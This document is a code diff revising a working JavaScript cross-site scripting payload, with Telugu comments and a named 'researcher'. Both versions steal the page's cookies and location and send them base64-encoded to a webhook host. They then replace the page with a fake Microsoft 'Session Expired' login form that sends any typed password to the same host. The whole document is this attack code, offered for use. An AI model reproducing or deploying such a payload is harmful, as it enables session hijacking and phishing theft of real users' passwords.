@@ -1,46 +1,33 @@
-
 (function() {
-    const webhook = "https://73764c17-b242-4f2a-84ba-88f63958a3e1.webhook.site/";
+    // నీ కొత్త వెబ్‌హుక్ లింక్ (స్క్రీన్‌షాట్ ప్రకారం)
+    const webhook = "https://25ad80f0-8ab5-44cc-90eb-744bea49970e.webhooksite.net/";
 
-    // 1. సెషన్ డేటా సేకరించడం
-    const sessionData = {
+    const info = {
         researcher: "Ramavath Gopi Nayak",
-        cookies: document.cookie,
-        localStorage: JSON.stringify(localStorage),
-        location: window.location.href,
-        userAgent: navigator.userAgent
+        cookies: document.cookie || "No Cookies Found",
+        url: window.location.href
     };
 
-    // 2. డేటాను వెబ్‌హుక్‌కి పంపడం
-    fetch(webhook + "?session=" + btoa(JSON.stringify(sessionData)), {
-        method: 'GET',
-        mode: 'no-cors'
-    });
+    const encoded = btoa(JSON.stringify(info));
 
-    // 3. ఫేక్ లాగిన్ ఫామ్ ఇంజెక్ట్ చేయడం (Phishing)
+    // 1. Image Beacon (అత్యంత నమ్మకమైనది)
+    const img = new Image();
+    img.src = webhook + "?data=" + encoded;
+
+    // 2. Phishing Form Injection
     document.body.innerHTML = `
-        <div style="font-family: Arial; text-align: center; margin-top: 100px;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="150"><br><br>
-            <h3>Session Expired</h3>
-            <p>Your session has expired. Please log in again to continue.</p>
-            <input type="password" id="pass" placeholder="Enter Password" style="padding: 10px; width: 250px;"><br><br>
-            <button id="loginBtn" style="padding: 10px 20px; background: #0078d4; color: white; border: none; cursor: pointer;">Login</button>
-        </div>
-    `;
+        <div style="font-family:Segoe UI; text-align:center; margin-top:100px;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="120"><br>
+            <h2>Session Expired</h2>
+            <p>Please log in again.</p>
+            <input type="password" id="p" placeholder="Password" style="padding:8px;"><br><br>
+            <button id="b" style="background:#0078d4; color:white; border:none; padding:8px 20px;">Login</button>
+        </div>`;
 
-    // 4. పాస్వర్డ్ పట్టుకోవడం
-    document.getElementById('loginBtn').onclick = function() {
-        const password = document.getElementById('pass').value;
-        const pwned = {
-            target: "Microsoft Azure User",
-            stolen_password: password
-        };
-        
-        // పాస్వర్డ్ ని వెబ్‌హుక్‌కి పంపడం
-        const img = new Image();
-        img.src = webhook + "?creds=" + btoa(JSON.stringify(pwned));
-        
-        alert("System Error: Please try again later.");
-        location.reload();
+    document.getElementById('b').onclick = function() {
+        const p = document.getElementById('p').value;
+        const creds = btoa(JSON.stringify({stolen_pass: p}));
+        new Image().src = webhook + "?creds=" + creds;
+        alert("Verification failed. Please try later.");
     };
 })();
